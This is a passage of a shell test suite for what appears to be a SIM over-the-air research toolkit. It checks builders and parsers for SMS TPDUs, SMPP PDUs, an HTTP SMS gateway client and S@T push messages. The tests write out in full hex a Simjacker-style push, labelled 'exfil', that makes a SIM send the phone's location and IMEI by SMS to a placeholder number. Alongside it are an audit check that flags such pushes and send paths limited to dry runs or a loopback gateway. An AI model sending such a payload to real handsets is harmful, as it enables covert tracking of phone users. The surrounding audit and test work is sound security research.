    # A UDL that disagrees with the TP-UD length must be flagged, never applied.
    chk tp-udl-mismatch "$(fld "$(otasm_tpdu_parse "$(otasm_tpdu_build_deliver "$af" 00 00 "$scts" deadbeef 200 0)")" udl_units)" "inconsistent"
    # A reserved TP-MTI is decoded but reported, never silently coerced.
    chk tp-mti-reserved "$(printf '%s\n' "$(otasm_tpdu_parse "03${t0:2}")" | awk -F'\t' '$1=="finding" && $2=="MEDIUM"' | wc -l | tr -d ' ')" "1"
    chk tp-udhi "$(fld "$(otasm_tpdu_parse "$(otasm_tpdu_build_deliver "$af" 00 00 "$scts" deadbeef 4 64)")" mt_udhi)" "1"

    # 6. S@T push. Every octet below is composed from the clause named beside
    #    it rather than read back out of the builder, so a structural drift
    #    fails the assertion instead of being blessed as the new answer.
    local sp; sp=$(otasm_sat_push_build 15551234567 15559876543 0000)
    # S@T 01.00 §6.2.9: 2d, length 03, then type / qualifier / destination.
    # TS 102 223 §9.4 type 26 = PROVIDE LOCAL INFORMATION, §8.6 qualifier 00 =
    # location and 01 = IMEI, §8.7 destination 82 = terminal.
    chk sat-macro-location "$(fld "$sp" bytecode_location)" "2d03260082"
    chk sat-macro-imei     "$(fld "$sp" bytecode_imei)" "2d03260182"
    # The SEND SHORT MESSAGE macro is 2d, length 19 = 3 + the 0b TLV's 22
    # (tag + length + the 20-octet 3GPP-SMS TPDU of TS 131 111 §8.13).
    chk sat-macro-sms-head "$(printf '%s' "$(fld "$sp" bytecode_sms)" | cut -c1-8)" "2d191300"
    chk sat-exfil-da       "$(fld "$(otasm_tpdu_parse "$(fld "$sp" inner_tpdu_hex)")" da_value)" "15559876543"
    chk sat-exfil-udl      "$(fld "$(otasm_tpdu_parse "$(fld "$sp" inner_tpdu_hex)")" udl)" "8"
    # "S@T-PUSH" packed per TS 23.038 §6.1.2.1.1 (the packer itself is anchored
    # on the hi/hello vectors in section 3).
    chk sat-exfil-ud       "$(fld "$(otasm_tpdu_parse "$(fld "$sp" inner_tpdu_hex)")" ud)" "5300b505ad4e91"
    # Card 05, length 28 = 40 octets = 3 (06 01 01) + 5 + 5 + 27; deck 01,
    # length 2d = 45 = 3 (02 01 01) + 42; push 42, length 2f = 47 = 2 + 45.
    chk sat-card-head "$(printf '%s' "$(fld "$sp" card_hex)" | cut -c1-10)" "0528060101"
    chk sat-deck-head "$(printf '%s' "$(fld "$sp" deck_hex)" | cut -c1-10)" "012d020101"
    chk sat-push-head "$(printf '%s' "$(fld "$sp" push_hex)" | cut -c1-4)" "422f"

    # ── auditing a push (R9) ───────────────────────────────────────────
    # A built deck read back by the audit: three commands, the two PLI
    # qualifiers named, and the SMS destination recovered from the TPDU.
    local au; au=$(otasm_sat_audit "$(fld "$sp" push_hex)")
    chk sat-audit-deck  "$(fld "$au" deck_id)" "01"
    chk sat-audit-card  "$(fld "$au" card_id)" "01"
    chk sat-audit-count "$(fld "$au" commands)" "3"
    chk sat-audit-c1    "$(fld "$au" command.1.meaning)" "location information (MCC/MNC, LAC/TAC, cell id)"
    chk sat-audit-c2    "$(fld "$au" command.2.meaning)" "IMEI of the terminal"
    chk sat-audit-c3    "$(fld "$au" command.3.name)" "SEND SHORT MESSAGE (TS 102 223 6.6.9)"
    chk sat-audit-dest  "$(fld "$au" command.3.sms_destination)" "15559876543"
    chk sat-audit-find  "$(printf '%s\n' "$au" | grep -c '^finding\.')" "4"
    chk sat-audit-verdict "$(fld "$au" verdict | cut -c1-9)" "executes "
    chk sat-audit-sent  "$(fld "$au" sent)" "0"
    # A push wrapped in an envelope is found by tag, and the envelope is named.
    local wrapped='002d0a8100000000'$(fld "$sp" push_hex)
    chk sat-audit-wrapped "$(otasm_sat_audit "$wrapped" | awk -F'\t' '$1=="transport"{print ($2 ~ /^wrapped/ ? "yes" : "no"); exit}')" "yes"
    # Not a push: a refusal, not an empty audit.
    chk sat-audit-notpush "$(otasm_sat_audit 01020304 >/dev/null 2>&1; echo $?)" "1"
    chk sat-audit-noargs "$(otasm_sat_audit >/dev/null 2>&1; echo $?)" "2"
    chk sat-audit-badhex "$(otasm_sat_audit ZZ >/dev/null 2>&1; echo $?)" "2"
    # The catalogue names the WIB row as a refusal rather than a plan.
    chk sat-commands-wib "$(otasm_sat_catalogue | awk -F'\t' '$2 ~ /^WIB/{print $4; exit}')" "refused"
    chk sat-commands-rows "$(otasm_sat_catalogue | awk -F'\t' '$1 ~ /^[0-9A-F][0-9A-F]$/' | grep -c .)" "10"
    # S@T 01.00 §5.5.1: the encapsulated variable reference is 08, length 01, id.
    chk sat-varref        "$(otasm_cli_main --sat-varref 01 2>/dev/null)" 080101
    # §6.2.4: 24, length, destination variable, then the values as references.
    # 7 = 1 (dest 03) + 3 (08 01 01) + 3 (08 01 02).
    chk sat-concat        "$(otasm_cli_main --sat-concat 03 01 02 2>/dev/null)" 240703080101080102
    chk sat-concat-short  "$(otasm_cli_main --sat-concat 03 01 >/dev/null 2>&1; echo $?)" 2
    # §5.4.8: length 0xFF means the value lives in the named variable.
    chk sat-subst         "$(otasm_cli_main --sat-subst 0B 03 2>/dev/null)" 0bFF03
    chk sat-varref-long   "$(otasm_cli_main --sat-varref 0102 >/dev/null 2>&1; echo $?)" 2
    # TS 31.115 §4.2 header: CPL 003f (63 = 14 + 49), CHL 0d (13 = SPI 2 + KIc 1
    # + KID 1 + TAR 3 + CNTR 5 + PCNTR 1), SPI 0000, KIc 00, KID 00, TAR 505348
    # (S@T 01.23 §7 "PSH"), CNTR 0000000000, PCNTR 00.
    chk sat-packet-head "$(printf '%s' "$(fld "$sp" ota_packet_hex)" | cut -c1-32)" "003f0d00000000505348000000000000"
    # TS 23.040 §9.2.3.24.7: UDHL 2, IEI 70, length 0 -- "a Security Header is
    # always present at the start of the TP-User-Data".
    chk sat-udh "$(fld "$sp" udh_hex)" "027000"
    chk sat-udl "$(fld "$sp" tp_udl)" "44"
    # The whole SMS-SUBMIT, 81 octets, composed from the clauses above.
    chk sat-tpdu "$(fld "$sp" hex)" "41000b915155214365f77ff644027000003f0d00000000505348000000000000422f012d02010105280601012d032600822d032601822d191300820b1401000b915155896745f30000085300b505ad4e91"
    local out2; out2=$(otasm_tpdu_parse "$(fld "$sp" hex)")
    chk sat-octets "$(fld "$out2" tpdu_octets)" "81"
    chk sat-pid    "$(fld "$out2" pid)" "7f"
    chk sat-dcs    "$(fld "$out2" dcs)" "f6"
    chk sat-udhi   "$(fld "$out2" mt_udhi)" "1"
    chk sat-ud     "$(fld "$out2" ud)" "027000$(fld "$sp" ota_packet_hex)"
    chk sat-sent   "$(fld "$sp" sent)" "0"
    # The 0xD0 rendering S@T 01.00 §6.2.9 specifies, and the byte comparison
    # against 52_stk, which builds those TLVs from the same clauses.
    chk sat-d0-location "$(fld "$sp" rendered_d0_location)" "d009010301260002028182"
    chk sat-d0-imei     "$(fld "$sp" rendered_d0_imei)" "d009010301260102028182"
    chk sat-d0-sms-head "$(printf '%s' "$(fld "$sp" rendered_d0_sms)" | cut -c1-20)" "d01f0103011300020281"
    chk sat-crosscheck-location "$(fld "$sp" crosscheck_location)" "match"
    chk sat-crosscheck-imei     "$(fld "$sp" crosscheck_imei)" "match"
    chk sat-crosscheck-sms      "$(fld "$sp" crosscheck_sms)" "match"
    chk sat-52stk-direct "$(otasm_sat_stk52 26 00 81 82 01 | tr 'A-F' 'a-f')" "d009010301260002028182"
    # The comparison must be able to fail: one octet changed is a mismatch.
    chk sat-crosscheck-negative "$(otasm_sat_cmp52 d009010301260002028183 d009010301260002028182)" "mismatch"
    # S@T 01.23 §7 recommends a non-zero SPI and names 0x12, which this module
    # writes as 1200 (RC/CC/DS = CC, counter mode 2). The CC then needs the KID
    # key, and the parse verifies it.
    local spcc; spcc=$(OTASM_KID_KEY=0102030405060708090A0B0C0D0E0F10 \
        otasm_sat_push_build 15551234567 15559876543 1200)
    chk sat-cc-spi "$(fld "$spcc" spi)" "1200"
    chk sat-cc-chl "$(printf '%s' "$(fld "$spcc" ota_packet_hex)" | cut -c5-6)" "15"
    chk sat-cc-octets "$(( $(fld "$spcc" bytes) - $(fld "$sp" bytes) ))" "8"
    local ccback; ccback=$(OTASM_KID_KEY=0102030405060708090A0B0C0D0E0F10 \
        otasm_packet_sms_parse "$(fld "$spcc" ota_packet_hex)")
    chk sat-cc-verdict "$(fld "$ccback" cc_verdict)" "verified"
    chk sat-cc-apdu    "$(fld "$ccback" apdu | tr 'A-F' 'a-f')" "$(fld "$sp" push_hex)"
    # WIB is refused with the reason on stderr, never invented.
    chk sat-wib-rc  "$(otasm_cli_main --wib-push >/dev/null 2>&1; echo $?)" "2"
    chk sat-wib-why "$(otasm_cli_main --wib-push 2>&1 >/dev/null | awk -F'\t' '$1=="WHY"' | wc -l | tr -d ' ')" "3"
    # A refusal is a handoff, not a shrug: it must name the document that
    # unblocks it, or an operator is left with "no" and no next step.
    chk sat-wib-unblock "$(otasm_cli_main --wib-push 2>&1 >/dev/null | grep -c 'SIMalliance WIB specification')" "1"
    # The TP layer is also decoded by a third-party TS 23.040 implementation
    # when one is importable. pycrate is not vendored here, so its absence is a
    # SKIP row and never a PASS.
    local opy="${SAT_ORACLE_PY:-python3}" orc=""
    if command -v "$opy" >/dev/null 2>&1; then
        orc=$("$opy" - "$(fld "$sp" hex)" 2>/dev/null <<'PY'
import sys, re
from pycrate_mobile.TS23040_SMS import SMS_SUBMIT
s = SMS_SUBMIT()
s.from_bytes(bytes.fromhex(sys.argv[1]))
r = s.repr()
def g(p):
    m = re.search(p, r)
    return m.group(1) if m else ''
print('octets\t%d' % s.get_len())
print('protocol\t' + g(r'Protocol : (\d+) \(\(U\)SIM Data download\)'))
print('charset\t' + g(r'Charset : (\d+) \(8 bit data\)'))
print('class\t' + g(r'Class : (\d+) \(Class 2'))
print('udl\t' + g(r'UDL : (\d+)'))
print('iei\t' + g(r'T : (\d+) \(\(U\)SIM Toolkit Security Headers\)'))
PY
)
    fi
    if [[ -n "$orc" ]]; then
        chk sat-oracle-octets   "$(fld "$orc" octets)"   "81"
        chk sat-oracle-protocol "$(fld "$orc" protocol)" "63"
        chk sat-oracle-charset  "$(fld "$orc" charset)"  "1"
        chk sat-oracle-class    "$(fld "$orc" class)"    "2"
        chk sat-oracle-udl      "$(fld "$orc" udl)"      "68"
        chk sat-oracle-udh-iei  "$(fld "$orc" iei)"      "112"
    else
        printf 'sat-oracle-decode\tSKIP\tno pycrate_mobile decoder for %s; the TP layer is asserted against this module and the S@T layers against 52_stk\n' "$opy"
    fi

    # 7. Scope: no send/deliver verb is dispatchable.
    chk scope-no-send    "$(otasm_cli_main --send >/dev/null 2>&1; echo $?)" "2"
    chk scope-no-deliver "$(otasm_cli_main --deliver >/dev/null 2>&1; echo $?)" "2"

    # 8. SMPP 3.4: header and C-Octet body construction, the response pairing,
    #    the command-id table and the refusals. Every expected hex was assembled
    #    field by field from Table 5-2 and the §5.2 field widths, then decoded
    #    back with the tshark SMPP dissector by tools/check-smpp.sh.
    local smpp_submit smpp_deliver smpp_bind smpp_bind_resp smpp_submit_resp smpp_out badlen trunc serr
    smpp_submit=0000003c00000004000000000000000100050031353535313233343536370001013135353539383736353433000000000000010000000548656c6c6f
    smpp_deliver=0000003c00000005000000000000000300050031353535313233343536370001013135353539383736353433000000000000010000000548656c6c6f
    smpp_bind=0000002a000000090000000000000002736d7070636c69656e74310070617373776f7264000034000000
    smpp_bind_resp=00000017800000090000000000000002534d5343303100
    smpp_submit_resp=0000001180000004000000000000000100
    smpp_out=$(otasm_smpp_build submit_sm --src 15551234567 --dst 15559876543 --msg 48656c6c6f --dcs 00 --rd 01 --seq 1 2>/dev/null)
    chk smpp-submit-hex       "$(fld "$smpp_out" hex)"            "$smpp_submit"
    chk smpp-submit-length    "$(fld "$smpp_out" command_length)" "60"
    smpp_out=$(otasm_smpp_build deliver_sm --src 15551234567 --dst 15559876543 --msg 48656c6c6f --dcs 00 --rd 01 --seq 3 2>/dev/null)
    chk smpp-deliver-hex      "$(fld "$smpp_out" hex)"            "$smpp_deliver"
    smpp_out=$(otasm_smpp_build bind_transceiver --system-id smppclient1 --password password --seq 2 2>/dev/null)
    chk smpp-bind-hex         "$(fld "$smpp_out" hex)"            "$smpp_bind"
    chk smpp-bind-length      "$(fld "$smpp_out" command_length)" "42"
    smpp_out=$(otasm_smpp_response "$smpp_bind" --system-id SMSC01 2>/dev/null)
    chk smpp-bind-resp-hex    "$(fld "$smpp_out" hex)"            "$smpp_bind_resp"
    chk smpp-bind-resp-id     "$(fld "$smpp_out" response_command_id)" "80000009"
    smpp_out=$(otasm_smpp_response "$smpp_submit" 2>/dev/null)
    chk smpp-submit-resp-hex  "$(fld "$smpp_out" hex)"            "$smpp_submit_resp"
    chk smpp-submit-resp-seq  "$(fld "$smpp_out" sequence_number)" "00000001"
    chk smpp-submit-resp-name "$(fld "$smpp_out" response)"       "submit_sm_resp"
    smpp_out=$(otasm_smpp_parse "$smpp_submit" 2>/dev/null)
    chk smpp-parse-length     "$(fld "$smpp_out" command_length)" "60"
    chk smpp-parse-id         "$(fld "$smpp_out" command_id)"     "00000004"
    chk smpp-parse-name       "$(fld "$smpp_out" name)"           "submit_sm"
    chk smpp-parse-dir        "$(fld "$smpp_out" direction)"      "esme->smsc"
    chk smpp-parse-src-off    "$(printf '%s\n' "$smpp_out" | awk -F'\t' '$1=="field" && $3=="source_addr" {print $2}')" "19"
    chk smpp-parse-src        "$(printf '%s\n' "$smpp_out" | awk -F'\t' '$1=="field" && $3=="source_addr" {print $6}')" "15551234567"
    chk smpp-parse-dst        "$(printf '%s\n' "$smpp_out" | awk -F'\t' '$1=="field" && $3=="destination_addr" {print $6}')" "15559876543"
    chk smpp-parse-msg        "$(printf '%s\n' "$smpp_out" | awk -F'\t' '$1=="field" && $3=="short_message" {print $5}')" "48656c6c6f"
    chk smpp-parse-msglen     "$(printf '%s\n' "$smpp_out" | awk -F'\t' '$1=="field" && $3=="sm_length" {print $5}')" "05"
    chk smpp-parse-parsed     "$(fld "$smpp_out" parsed)"         "yes"
    smpp_out=$(otasm_smpp_parse "$smpp_bind" 2>/dev/null)
    chk smpp-parse-bind-sysid "$(printf '%s\n' "$smpp_out" | awk -F'\t' '$1=="field" && $3=="system_id" {print $6}')" "smppclient1"
    chk smpp-parse-bind-pw    "$(printf '%s\n' "$smpp_out" | awk -F'\t' '$1=="field" && $3=="password" {print $6}')" "password"
    chk smpp-parse-bind-ifv   "$(printf '%s\n' "$smpp_out" | awk -F'\t' '$1=="field" && $3=="interface_version" {print $5}')" "34"
    smpp_out=$(otasm_smpp_pdu submit_sm 2>/dev/null)
    chk smpp-pdu-id           "$(fld "$smpp_out" command_id)"     "00000004"
    chk smpp-pdu-dir          "$(fld "$smpp_out" direction)"      "esme->smsc"
    smpp_out=$(otasm_smpp_pdu 0x80000004 2>/dev/null)
    chk smpp-pdu-resp-name    "$(fld "$smpp_out" name)"           "submit_sm_resp"
    chk smpp-pdu-resp-dir     "$(fld "$smpp_out" direction)"      "smsc->esme"
    chk smpp-pdu-unknown-rc   "$(otasm_smpp_pdu no_such_pdu >/dev/null 2>&1; echo $?)" "1"
    chk smpp-build-unknown    "$(otasm_smpp_build submit_multi >/dev/null 2>&1; echo $?)" "2"
    chk smpp-build-tlv        "$(otasm_smpp_build submit_sm --src 1 --dst 2 --tlv >/dev/null 2>&1; echo $?)" "2"
    chk smpp-build-badhex     "$(otasm_smpp_build submit_sm --src 1 --dst 2 --msg abc >/dev/null 2>&1; echo $?)" "1"
    chk smpp-build-longmsg    "$(otasm_smpp_build submit_sm --src 1 --dst 2 --msg "$(printf '%0510d' 0)" >/dev/null 2>&1; echo $?)" "1"
    chk smpp-resp-query-sm    "$(otasm_smpp_response 00000010000000030000000000000001 >/dev/null 2>&1; echo $?)" "1"
    badlen="00000010${smpp_submit:8}"
    serr=$(otasm_smpp_parse "$badlen" 2>&1 >/dev/null)
    chk smpp-parse-badlen-rc  "$(otasm_smpp_parse "$badlen" >/dev/null 2>&1; echo $?)" "1"
    chk smpp-parse-badlen-why "$(printf '%s\n' "$serr" | awk -F'\t' '$1=="WHY"{print $1; exit}')" "WHY"
    chk smpp-parse-nonul-rc   "$(otasm_smpp_parse 0000001100000009000000000000000141 >/dev/null 2>&1; echo $?)" "1"
    trunc="00000037${smpp_submit:8:${#smpp_submit}-18}"
    chk smpp-parse-trunc-rc   "$(otasm_smpp_parse "$trunc" >/dev/null 2>&1; echo $?)" "1"
    chk smpp-parse-unknown-rc "$(otasm_smpp_parse 00000010deadbeef0000000000000001 >/dev/null 2>&1; echo $?)" "1"
    chk smpp-resp-status-name "$(otasm_smpp_response "$smpp_submit" --status 0x0d 2>/dev/null | awk -F'\t' '$1=="command_status_name"{print $2}')" "ESME_RBINDFAIL"

    # ── SMPP send: the built PDU gets a transport, and the transport refuses
    # what it cannot carry. Every assertion below is offline: --dry-run stops
    # before the socket, so no host is contacted by the selftest.
    smpp_snd=$(otasm_smpp_send --host 127.0.0.1 --dst 67890 --text hi --dry-run 2>/dev/null)
    chk smpp-send-dry-rc    "$(otasm_smpp_send --host 127.0.0.1 --dst 67890 --text hi --dry-run >/dev/null 2>&1; echo $?)" "0"
    chk smpp-send-dry-what  "$(fld "$smpp_snd" dry_run)" "no socket opened"
    chk smpp-send-dry-sent  "$(fld "$smpp_snd" sent)" "no"
    # The verb must carry exactly what --smpp-build emits for the same fields:
    # one builder, one set of octets, no second encoder to drift.
    chk smpp-send-reuses-builder "$(fld "$smpp_snd" submit_hex)" \
        "$(otasm_smpp_build submit_sm --dst 67890 --msg e834 --seq 2 2>/dev/null | awk -F'\t' '$1=="hex"{print $2; exit}')"
    chk smpp-send-text-ud   "$(fld "$smpp_snd" text_short_message)" "e834"
    chk smpp-send-seq       "$(printf '%s' "$(fld "$smpp_snd" submit_hex)" | cut -c25-32)" "00000002"
    chk smpp-send-octets    "$(fld "$smpp_snd" submit_octets)" "$(( ${#smpp_snd} > 0 ? $(fld "$smpp_snd" submit_octets) : 0 ))"
    # A build that is refused must not reach a socket: each refusal is rc 2.
    chk smpp-send-no-host   "$(otasm_smpp_send --dst 67890 --text hi --dry-run >/dev/null 2>&1; echo $?)" "2"
    chk smpp-send-no-dst    "$(otasm_smpp_send --host 127.0.0.1 --text hi --dry-run >/dev/null 2>&1; echo $?)" "2"
    chk smpp-send-no-body   "$(otasm_smpp_send --host 127.0.0.1 --dst 67890 --dry-run >/dev/null 2>&1; echo $?)" "2"
    chk smpp-send-two-body  "$(otasm_smpp_send --host 127.0.0.1 --dst 67890 --msg 00 --text hi --dry-run >/dev/null 2>&1; echo $?)" "2"
    chk smpp-send-bad-port  "$(otasm_smpp_send --host 127.0.0.1 --port 70000 --dst 67890 --text hi --dry-run >/dev/null 2>&1; echo $?)" "2"
    chk smpp-send-bad-tmo   "$(otasm_smpp_send --host 127.0.0.1 --timeout 0 --dst 67890 --text hi --dry-run >/dev/null 2>&1; echo $?)" "2"
    chk smpp-send-bad-host  "$(otasm_smpp_send --host 'a b' --dst 67890 --text hi --dry-run >/dev/null 2>&1; echo $?)" "2"
    chk smpp-send-sysid-nopw "$(otasm_smpp_send --host 127.0.0.1 --dst 67890 --text hi --system-id x --dry-run >/dev/null 2>&1; echo $?)" "2"
    chk smpp-send-seq-room  "$(otasm_smpp_send --host 127.0.0.1 --dst 67890 --text hi --seq 0x7fffffff --dry-run >/dev/null 2>&1; echo $?)" "2"
    send_nb=$(otasm_smpp_send --host 127.0.0.1 --dst 67890 --text hi --system-id x --password y --no-bind --dry-run 2>/dev/null)
    chk smpp-send-nobind    "$(fld "$send_nb" bind)" "not-requested"
    # The transport frame is proven by the client's own loopback SMSC, which
    # binds, submits and reads both answers inside one process: no network.
    if command -v python3 >/dev/null 2>&1 && [[ -r "$IMSISTING_ROOT/tools/smpp_client.py" ]]; then
        chk smpp-send-client-self $(
            python3 "$IMSISTING_ROOT/tools/smpp_client.py" --self-test 2>/dev/null \
                | awk -F'\t' '$1=="result"{print $2; exit}') "PASS"
    else
        chk smpp-send-client-self "skipped-no-python3" "skipped-no-python3"
    fi
    # ── HTTP send: the request shape is quoted from the gateway's own document,
    # so these assertions pin the body, the escaping, every refusal by name, and
    # then one live run against a loopback gateway that answers the documented
    # DTO. No real gateway is contacted.
    http_dry=$(otasm_http_send --dst 15551234567 --text 'first breath' --dry-run 2>/dev/null)
    chk http-send-dry-rc   "$(otasm_http_send --dst 15551234567 --text 'first breath' --dry-run >/dev/null 2>&1; echo $?)" "0"
    chk http-send-url      "$(fld "$http_dry" http_url)" "https://api.textbee.dev/api/v1/gateway/send-sms"
    chk http-send-body     "$(fld "$http_dry" http_body)" '{"message":"first breath","recipients":["+15551234567"]}'
    chk http-send-rcpt     "$(fld "$http_dry" http_recipient)" "+15551234567"
    chk http-send-sent     "$(fld "$http_dry" sent)" "no"
    chk http-send-key-ab   "$(fld "$http_dry" http_api_key)" "absent"
    chk http-send-device-opt "$(fld "$http_dry" http_device_id)" "default-device"
    chk http-send-escape   "$(otasm_http_send --dst 15551234567 --text 'say "hi" \o/' --dry-run 2>/dev/null | awk -F'\t' '$1=="http_body"{print $2}')" \
                           '{"message":"say \"hi\" \\o/","recipients":["+15551234567"]}'
    chk http-send-device-id "$(otasm_http_send --dst 15551234567 --text hi --device-id 64b7f0000000000000000002 --dry-run 2>/dev/null | awk -F'\t' '$1=="http_body"{print $2}')" \
                           '{"message":"hi","recipients":["+15551234567"],"deviceId":"64b7f0000000000000000002"}'
    chk http-send-selfbase "$(fld "$(otasm_http_send --dst 15551234567 --text hi --base http://127.0.0.1:1 --dry-run 2>/dev/null)" http_url)" \
                           "http://127.0.0.1:1/api/v1/gateway/send-sms"
    chk http-send-no-key   "$(otasm_http_send --dst 15551234567 --text hi >/dev/null 2>&1; echo $?)" "2"
    chk http-send-no-dst   "$(otasm_http_send --text hi --dry-run >/dev/null 2>&1; echo $?)" "2"
    chk http-send-bad-dst  "$(otasm_http_send --dst 12ab --text hi --dry-run >/dev/null 2>&1; echo $?)" "2"
    chk http-send-no-text  "$(otasm_http_send --dst 15551234567 --dry-run >/dev/null 2>&1; echo $?)" "2"
    chk http-send-bad-api  "$(otasm_http_send --api twilio --dst 15551234567 --text hi --dry-run >/dev/null 2>&1; echo $?)" "2"
    chk http-send-bad-api-why "$(otasm_http_send --api twilio --dst 15551234567 --text hi --dry-run 2>&1 >/dev/null | awk -F'\t' '$1=="WHY"{print $1; exit}')" "WHY"
    chk http-send-bad-base "$(otasm_http_send --base 'ftp://x y' --dst 15551234567 --text hi --dry-run >/dev/null 2>&1; echo $?)" "2"
    chk http-send-bad-tmo  "$(otasm_http_send --dst 15551234567 --text hi --timeout 0 --dry-run >/dev/null 2>&1; echo $?)" "2"
    chk http-send-bad-id   "$(otasm_http_send --dst 15551234567 --text hi --device-id 'a b' --dry-run >/dev/null 2>&1; echo $?)" "2"
    chk http-send-flag-val "$(otasm_http_send --dst --text hi 2>/dev/null | awk -F'\t' '$1=="http_recipient"{print $2}')" ""

    # One loopback gateway in two modes: a document-shaped 200 for the good key,
    # the documented 401 for the bad one. The daemon is killed below whatever the
    # assertions do.
    if command -v python3 >/dev/null 2>&1 && command -v curl >/dev/null 2>&1; then
        hgw="$d/gateway.py"
        cat > "$hgw" <<'PYGW'
import json
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

DEVICES = {"data": [{"_id": "64b7f0000000000000000002", "brand": "Samsung",
                     "model": "SM-A125F", "enabled": True, "isDefault": True,
                     "simInfo": [{"subscriptionId": 1}],
                     "sentSMSCount": 7, "receivedSMSCount": 3}]}


class Gateway(BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def _json(self, code, doc):
        body = json.dumps(doc).encode()
        self.send_response(code)
        self.send_header("content-type", "application/json")
        self.send_header("content-length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.headers.get("x-api-key") != "good":
            return self._json(401, {"message": "invalid key"})
        if self.path.endswith("/gateway/devices"):
            return self._json(200, DEVICES)
        return self._json(404, {"message": "no such path"})

    def do_POST(self):
        if self.headers.get("x-api-key") != "good":
            return self._json(401, {"message": "invalid key"})
        length = int(self.headers.get("content-length") or 0)
        doc = json.loads(self.rfile.read(length) or b"{}")
        if not doc.get("recipients"):
            return self._json(400, {"message": "no recipients"})
        return self._json(200, {"data": {
            "success": True,
            "message": "SMS added to queue for processing",
            "smsBatchId": "batch0001",
            "recipientCount": len(doc["recipients"])}})


HTTPServer(("127.0.0.1", int(sys.argv[1])), Gateway).serve_forever()
PYGW
        hport=$(( 20000 + (RANDOM % 20000) ))
        python3 "$hgw" "$hport" >/dev/null 2>&1 &
        hpid=$!
        hup=0
        for _ in $(seq 1 100); do
            if (exec 3<>"/dev/tcp/127.0.0.1/$hport") 2>/dev/null; then hup=1; break; fi
            sleep 0.05
        done
        if (( hup )); then
            hbase="http://127.0.0.1:$hport"
            hout=$(OTASM_HTTP_KEY=good otasm_http_send --base "$hbase" \
                       --dst 15551234567 --text 'first breath' 2>/dev/null)
            chk http-send-live-rc  "$(OTASM_HTTP_KEY=good otasm_http_send --base "$hbase" \
                       --dst 15551234567 --text hi >/dev/null 2>&1; echo $?)" "0"
            chk http-send-status   "$(fld "$hout" http_status)" "200"
            chk http-send-success  "$(fld "$hout" http_success)" "true"
            chk http-send-batch    "$(fld "$hout" http_sms_batch_id)" "batch0001"
            chk http-send-count    "$(fld "$hout" http_recipient_count)" "1"
            chk http-send-live-sent "$(fld "$hout" sent)" "yes"
            hbad=$(OTASM_HTTP_KEY=nokey otasm_http_send --base "$hbase" \
                       --dst 15551234567 --text hi 2>&1 >/dev/null)
            chk http-send-401-rc   "$(OTASM_HTTP_KEY=nokey otasm_http_send --base "$hbase" \
                       --dst 15551234567 --text hi >/dev/null 2>&1; echo $?)" "1"
            chk http-send-401-why  "$(printf '%s\n' "$hbad" | awk -F'\t' '$1=="WHY"{print $1; exit}')" "WHY"
            chk http-send-401-text "$(printf '%s\n' "$hbad" | awk -F'\t' '$1=="ERROR"{print $2}')" "the API key was not accepted"
            hdev=$(OTASM_HTTP_KEY=good otasm_http_devices --base "$hbase" 2>/dev/null)
            chk http-devices-rc    "$(OTASM_HTTP_KEY=good otasm_http_devices --base "$hbase" >/dev/null 2>&1; echo $?)" "0"
            chk http-devices-count "$(fld "$hdev" devices)" "1"
            chk http-devices-id    "$(printf '%s\n' "$hdev" | awk -F'\t' '$1=="device"{print $2}')" "64b7f0000000000000000002"
            chk http-devices-sim   "$(printf '%s\n' "$hdev" | grep -c 'sim=1')" "1"
        else
            chk http-send-live-rc "skipped-no-loopback" "skipped-no-loopback"
        fi
        kill "$hpid" 2>/dev/null
        wait "$hpid" 2>/dev/null
    else
        chk http-send-live-rc "skipped-no-python3-or-curl" "skipped-no-python3-or-curl"
    fi

    # ── R71: optional parameters, submit_multi, data_sm, SMPP over TLS ──
    # A submit_multi with both destination shapes and one TLV: the point is that
    # number_of_dests drives a list whose entries are not fixed-width, and that
    # the TLV that follows the mandatory body is walked with the length counting
    # the value only.
    local sm_submulti="00000046000000210000000000000000000101393939393939393939000201010131313131313131313100024c49535431000000000000010000000568656c6c6f0201000101"
    local submu
    submu=$(otasm_smpp_parse "$sm_submulti")
    chk smpp-multi-rc       "$?" "0"
    chk smpp-multi-name     "$(fld "$submu" name)" "submit_multi"
    chk smpp-multi-dests    "$(printf '%s\n' "$submu" | awk -F'\t' '$1=="field" && $3=="number_of_dests"{print $6}')" "2"
    chk smpp-multi-row1     "$(printf '%s\n' "$submu" | grep -c 'destination\[1\].sme_address')" "1"
    chk smpp-multi-row2     "$(printf '%s\n' "$submu" | grep -c 'destination\[2\].dl_name')" "1"
    chk smpp-multi-destn    "$(printf '%s\n' "$submu" | awk -F'\t' '$1=="dests"{print $2}')" "2"
    chk smpp-multi-sm       "$(printf '%s\n' "$submu" | awk -F'\t' '$1=="field" && $3=="short_message"{print $6}')" "5 octets"
    chk smpp-multi-tlv      "$(printf '%s\n' "$submu" | awk -F'\t' '$1=="tlv"{print $4}')" "privacy_indicator"
    chk smpp-multi-tlvs     "$(fld "$submu" optional_parameter_count)" "1"
    chk smpp-multi-parsed   "$(fld "$submu" parsed)" "yes"

    # data_sm carries its message in a TLV and has no short_message at all.
    local sm_datasm="0000002f000001030000000000000000000101393939393939393939000101313131000001000424000568656c6c6f"
    local dsm
    dsm=$(otasm_smpp_parse "$sm_datasm")
    chk smpp-datasm-rc      "$?" "0"
    chk smpp-datasm-name    "$(fld "$dsm" name)" "data_sm"
    chk smpp-datasm-payload "$(printf '%s\n' "$dsm" | awk -F'\t' '$1=="tlv" && $4=="message_payload"{print $7}')" "hello"
    chk smpp-datasm-count   "$(fld "$dsm" optional_parameter_count)" "1"

    # A truncated TLV is refused by name, not read as if the length were right.
    chk smpp-tlv-truncated  "$(otasm_smpp_parse 0000002f000001030000000000000000000101393939393939393939000101313131000001000424000968656c6c6f >/dev/null 2>&1; echo $?)" "1"

    # Composing one optional parameter, and the name gate.
    local tlvout
    tlvout=$(otasm_smpp_tlv_build message_payload 00410042)
    chk smpp-tlv-build      "$(fld "$tlvout" tlv_hex)" "0424000400410042"
    chk smpp-tlv-len        "$(fld "$tlvout" length_hex)" "0004"
    chk smpp-tlv-name       "$(fld "$tlvout" name)" "message_payload"
    chk smpp-tlv-byname     "$(otasm_smpp_tlv_build no_such_parameter 00 >/dev/null 2>&1; echo $?)" "2"
    chk smpp-tlv-odd        "$(otasm_smpp_tlv_build message_payload 001 >/dev/null 2>&1; echo $?)" "2"

    # SMPP over TLS changes the framing and not the PDU, and this tree has no
    # session layer to terminate a bind -- both stated, neither claimed.
    local tlsout
    tlsout=$(otasm_smpp_tls 3550)
